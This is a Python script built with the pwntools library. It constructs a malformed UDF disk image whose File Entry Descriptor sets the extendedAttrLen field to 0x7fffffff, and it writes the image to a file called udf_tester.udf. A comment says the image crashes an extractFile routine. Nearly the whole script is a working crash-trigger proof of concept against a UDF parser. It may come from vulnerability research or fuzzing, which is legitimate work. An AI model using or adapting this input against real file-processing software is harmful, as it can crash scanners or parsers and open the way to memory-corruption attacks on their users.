from pwn import *

# Causes a crash in extractFile due to extendedAttrLen size.

## Constants 
NUM_GENERIC_VOLUME_DESCRIPTORS = 3
VOLUME_DESC_SZ = 0x800
FILE_IDENTIFIER_DESCRIPTOR = 257
FILE_ENTRY_DESCRIPTOR = 261
FILE_IDENTIFIER_DESCRIPTOR_SIZE_KNOWN = 0x26
FILE_ENTRY_DESCRIPTOR_SIZE_KNOWN = 0xb0
JUNK = b"\x00"


def getFileIdentifierDescriptorPaddingLength(implLength, fidLength):
    ret = 0
    tmp = implLength + fidLength + 38
    ret = tmp+3;
    ret = ret/4 
    
    ret = ret*4 
    ret = ret-tmp
    return ret



def main():
    ## First, generic volume descriptors:
    #typedef struct  __attribute__((packed)) {
    #   uint8_t structType;
    #   char standardIdentifier[5];
    #   uint8_t structVersion;
    #   uint8_t rest[2041];
    #} GenericVolumeStructureDescriptor;
    genericVolumeDesc = flat([
        ## structType 
        JUNK,
        ## standardIdentifier
        "BEA01",
        ## structVersion
        JUNK,
        ## rest
        JUNK*2041 
    ])

    #typedef struct __attribute__((packed)) {
    #    DescriptorTag tag;
    #    uint32_t volumeDescriptorSequenceNumber;
    #    uint32_t primaryVolumeDescriptorNumber;
    #    uint8_t volumeIdentifier[32];
    #    uint16_t volumeSequenceNumber;
    #    uint16_t interchangeLevel;
    #    uint16_t maxInterchangeLevel;
    #    uint32_t charSetList;
    #    uint8_t volumeSetIdentifier[128];
    #    uint8_t descriptorCharSet[64];
    #    uint8_t explanatoryCharSet[64];
    #    uint64_t volumeAbstract;
    #    uint64_t volumeCopyrightNotice;
    #    uint8_t applicationIdentifier[32];
    #    uint8_t recordingDateTime[12];
    #    uint8_t implementationIdentifier[32];
    #    uint8_t implementationUse[64];
    #    uint32_t predVolumeDescSequenceLocation;
    #    uint16_t flags;
    #    uint8_t reserved[22];
    #
    #} PrimaryVolumeDescriptor;
    primaryVolumeDesc = flat([
        p16(1) ## PRIMARY_VOLUME_DESCRIPTOR
        ])
    primaryVolumeDesc += b"\x01" * (VOLUME_DESC_SZ - len(primaryVolumeDesc))

    #typedef struct __attribute__((packed)) {
    #    DescriptorTag tag;
    #    uint32_t volumeDescriptorSequenceNumber;
    #    regid implementationIdentifier;
    #    uint8_t implementationUse[460];
    #} ImplementationUseVolumeDescriptor;
    implVolumeDesc = flat([
        p16(4) ## IMPLEMENTATION_USE_VOLUME_DESCRIPTOR
        ])
    implVolumeDesc += b"\x01" * (VOLUME_DESC_SZ - len(implVolumeDesc))


    #typedef struct __attribute__((packed)) {
    #
    #    DescriptorTag tag;
    #
    #    uint32_t volumeDescriptorSequenceNumber;
    #
    #    charspec descriptorCharSet;
    #
    #    uint8_t logicalVolumeIdentifier[128]; // TODO: handle dstring
    #
    #    uint32_t logicalBlockSize;
    #
    #    regid domainIdentifier;
    #
    #    uint8_t logicalVolumeContentsUse[16];
    #
    #    uint32_t mapTableLength;
    #
    #    uint32_t numPartitionMaps;
    #
    #    regid implementationIdentifier;
    #
    #    uint8_t implementationUse[128];
    #
    #    ext_ad integritySequenceExtent;
    #
    #    uint8_t partitionMaps[1]; // actual length of mapTableLength above;
    #
    #} LogicalVolumeDescriptor;
    logicVolumeDesc = flat([
        p16(6) ## LOGICAL_VOLUME_DESCRIPTOR
        ])
    logicVolumeDesc += b"\x01" * (VOLUME_DESC_SZ - len(logicVolumeDesc))

    #typedef struct __attribute__((packed)) {
    #
    #    DescriptorTag tag;
    #
    #    uint32_t volumeDescriptorSequenceNumber;
    #
    #    uint16_t partitionFlags;
    #
    #    uint16_t partitionNumber;
    #
    #    regid partitionContents;
    #
    #    uint8_t partitionContentsUse[128];
    #
    #    uint32_t accessType;
    #
    #    uint32_t partitionStartingLocation;
    #
    #    uint32_t partitionLength;
    #
    #    regid implementationIdentifier;
    #
    #    uint8_t implementationUse[128];
    #
    #    uint8_t reserved[156];
    #
    #} PartitionDescriptor;
    partDesc = flat([
        p16(5) ## PARTITION_DESCRIPTOR
        ])
    partDesc += b"\x01" * (VOLUME_DESC_SZ - len(partDesc))

    #typedef struct __attribute__((packed)) {
    #    DescriptorTag tag;
    #
    #    uint32_t volumeDescriptorSequenceNumber;
    #
    #    uint32_t numAllocationDescriptors;
    #
    #    uint8_t rest[1]; /*reset is 'numAllocationDescriptors' * sizeof (extent_ad),
    #    and padded out to VOLUME_DESCRIPTOR_SIZE with zeros. */
    #
    #} UnallocatedSpaceDescriptor;
    unallocSpaceDesc = flat([
        p16(7) ## UNALLOCATED_SPACE_DESCRIPTOR
        ])
    unallocSpaceDesc += b"\x01" * (VOLUME_DESC_SZ - len(unallocSpaceDesc))

    #typedef struct __attribute__((packed)) {
    #    DescriptorTag tag;
    #
    #    uint8_t padding[496];
    #} TerminatingDescriptor;
    terminatingDesc = flat([
        p16(8) ## TERMINATING_DESCRIPTOR
        ])
    terminatingDesc += b"\x01" * (VOLUME_DESC_SZ - len(terminatingDesc))


    #typedef struct __attribute__((packed)) {
    #    DescriptorTag tag;
    #
    #    timestamp recordingDateTime;
    #
    #    uint32_t integrityType;
    #
    #    extent_ad nextIntegrityExtent;
    #
    #    uint8_t logicalVolumeContents[32];
    #
    #    uint32_t numPartitions;
    #
    #    uint32_t lenImplementationUse;
    #
    #    uint32_t freeSpaceTable;
    #
    #    uint32_t sizeTable;
    #
    #    uint8_t rest[1];
    #
    #} LogicalVolumeIntegrityDescriptor;
    LogicalVolumeIntegrityDescriptor = flat([
        p16(9) ## LOGICAL_VOLUME_INTEGRITY_DESCRIPTOR
        ])
    LogicalVolumeIntegrityDescriptor += b"\x01" * (VOLUME_DESC_SZ - len(LogicalVolumeIntegrityDescriptor))

    #typedef struct __attribute__((packed)) {
    #    DescriptorTag tag;
    #
    #    extent_ad mainVolumeDescriptorSequence;
    #
    #    extent_ad reserveVolumeDescriptorSequence;
    #
    #    uint8_t reserved[480];
    #
    #} AnchorVolumeDescriptorPointer;
    AnchorVolumeDescriptorPointer = flat([
        p16(2) ## ANCHOR_VOLUME_DESCRIPTOR_DESCRIPTOR_POINTER
        ])
    AnchorVolumeDescriptorPointer += b"\x01" * (VOLUME_DESC_SZ - len(AnchorVolumeDescriptorPointer))


    #typedef struct __attribute__((packed)) {
    #    DescriptorTag tag;
    #    timestamp recordingDateTime;
    #
    #    uint16_t interchangeLevel;
    #
    #    uint16_t maxInterchangeLevel;
    #    uint32_t characterSetList;
    #    uint32_t maxCharacterSetList;
    #
    #    uint32_t fileSetNumber;
    #    uint32_t fileSetDescriptorNumber;
    #
    #    charspec logicalVolumeIdentifierCharSet;
    #    uint8_t logicalVolumeIdentifier[128];
    #    charspec fileSetCharSet;
    #    uint8_t fileSetIdentifier[32];
    #
    #    uint8_t copyrightIdentifier[32];
    #    uint8_t abstractIdentifier[32];
    #    long_ad rootDirectoryICB;
    #
    #    regid domainIdentifier;
    #
    #    long_ad nextExtent;
    #    long_ad systemStreamDirectoryICB;
    #    uint8_t reserved[32];
    #
    #} FileSetDescriptor;
    FileSetDescriptor = flat([
        p16(256) ## FILE_SET_DESCRIPTOR
        ])
    FileSetDescriptor += b"\x01" * (VOLUME_DESC_SZ - len(FileSetDescriptor))

    #typedef struct __attribute__((packed)) {
    #    uint16_t tagId;
    #    uint16_t descriptorVersion;
    #    uint8_t checksum;
    #    uint8_t reserved;
    #    uint16_t serialNumber;
    #    uint16_t descriptorCRC;
    #    uint16_t descriptorCRCLength;
    #    uint32_t tagLocation;
    #} DescriptorTag;


    #typedef struct __attribute__((packed)) {
    #
    #    DescriptorTag tag;
    #
    #    uint16_t versionNumber;
    #
    #    uint8_t characteristics;
    #
    #    uint8_t fileIdentifierLength;
    #
    #    long_ad icb;
    #
    #    /*L_IU specified in 1/7.1.3 */
    #    uint16_t implementationLength;
    #
    #    uint8_t rest[1];
    #
    #} FileIdentifierDescriptor;
    implLength = VOLUME_DESC_SZ - FILE_IDENTIFIER_DESCRIPTOR_SIZE_KNOWN
    FID_DescriptorTag = flat([
        p16(FILE_IDENTIFIER_DESCRIPTOR),
        JUNK * (14 + 2),
        p16(0),
        b"\x41"*0x10,
        #implLength - getFileIdentifierDescriptorPaddingLength(implLength, 0)
        0

        ])
    FID_DescriptorTag += b"\x41" * (VOLUME_DESC_SZ - len(FID_DescriptorTag))

    #typedef struct __attribute__((packed)) {
    #    DescriptorTag tag;
    #
    #    ICBTag icbTag;
    #
    #    uint32_t uid;
    #
    #    uint32_t gid;
    #
    #    uint32_t permissions;
    #
    #    uint16_t fileLinkCnt;
    #
    #    uint8_t recordFormat;
    #    uint8_t recordDisplayAttributes;
    #
    #    uint32_t recordLength;
    #
    #    uint64_t infoLength;
    #
    #    uint64_t logicalBlocksRecorded;
    #
    #    timestamp accessDateTime;
    #
    #    timestamp modificationDateTime;
    #
    #    timestamp attributeDateTime;
    #
    #    uint32_t checkpoint;
    #
    #    long_ad extendedAttrICB;
    #
    #    regid implementationId;
    #
    #    uint64_t uniqueId;
    #
    #    uint32_t extendedAttrLen;
    #
    #    uint32_t allocationDescLen;
    #
    #    /* Variable length stuff here, need to handle;
    #     */
    #    uint8_t rest[1];
    #
    #} FileEntryDescriptor;

    FED_DescriptorTag = flat([
        p16(FILE_ENTRY_DESCRIPTOR),
        b"\x01"*(166), ## Just padding this out bcuz i cba
        ## This is the extendedAttrLen whoch we control.
        0x7fffffff,
        0x10 ## sizeof(long_ad)


        ])
    FED_DescriptorTag += b"\x42" * (VOLUME_DESC_SZ - len(FED_DescriptorTag))


    buf = flat([
        b"\x00" * 0x8000,
        genericVolumeDesc*NUM_GENERIC_VOLUME_DESCRIPTORS,
        primaryVolumeDesc,
        implVolumeDesc,
        logicVolumeDesc,
        partDesc,
        unallocSpaceDesc,
        terminatingDesc,
        LogicalVolumeIntegrityDescriptor,
        terminatingDesc,
        AnchorVolumeDescriptorPointer,
        FileSetDescriptor,
        FID_DescriptorTag,
        FED_DescriptorTag,
        b"B" * 0x800
        ])


    print(b"BUF: " + buf)
    f = open("udf_tester.udf", "wb")
    f.write(buf)
    f.close()
    
    

if __name__ == "__main__":
    main()
